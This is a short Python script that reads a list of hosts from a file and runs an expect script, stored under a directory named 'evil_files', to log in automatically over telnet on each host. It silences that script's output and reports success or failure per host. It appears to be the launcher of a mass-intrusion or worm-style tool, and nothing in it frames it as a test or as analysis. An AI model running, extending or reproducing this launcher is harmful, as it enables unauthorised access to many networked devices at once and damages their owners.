import subprocess as sp

def initDeploy(input_file):
    with open(input_file, "r", encoding="utf-8-sig") as f:
        for line in f:
            host = line.strip()
            if not host:
                continue

            print(f"[INFO] running on {host}")

            result = sp.run(
                ["expect", "evil_files/telnet_auto_login.sh", host],
                stdout=sp.DEVNULL,
                stderr=sp.DEVNULL,
                check=False
            )

            if result.returncode == 0:
                print(f"[OK]   {host}")
            else:
                print(f"[FAIL] {host} (code {result.returncode})")
